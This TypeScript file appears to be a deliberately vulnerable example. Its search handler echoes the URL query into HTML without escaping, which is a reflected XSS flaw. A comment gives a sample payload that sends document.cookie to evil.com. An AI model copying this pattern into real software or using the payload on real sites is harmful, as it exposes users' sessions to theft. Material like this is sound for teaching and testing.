/**
 * Simple HTTP request handler for a search page.
 * Renders search results with the query term displayed back to the user.
 */
export function handleSearchRequest(url: string): string {
  const parsed = new URL(url, 'http://localhost:3000');
  const query = parsed.searchParams.get('q') ?? '';
  const page = parseInt(parsed.searchParams.get('page') ?? '1', 10);

  // Simulate search results
  const results = performSearch(query, page);

  // Bug: The query string from the URL is interpolated directly into HTML
  // without escaping. An attacker can craft a URL like:
  //   /search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>
  // and the script will execute in the victim's browser.
  return `
    <!DOCTYPE html>
    <html>
    <head><title>Search Results</title></head>
    <body>
      <h1>Search Results</h1>
      <p>Showing results for: <strong>${query}</strong></p>
      <p>Page ${page} of ${results.totalPages}</p>
      <ul>
        ${results.items.map((item) => `<li>${escapeHtml(item.title)}</li>`).join('\n')}
      </ul>
    </body>
    </html>
  `;
}

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

interface SearchResult {
  items: { title: string; url: string }[];
  totalPages: number;
}

function performSearch(query: string, page: number): SearchResult {
  // Stub implementation
  return {
    items: [
      { title: `Result for "${query}" - item 1`, url: '/result/1' },
      { title: `Result for "${query}" - item 2`, url: '/result/2' },
    ],
    totalPages: Math.max(1, page),
  };
}
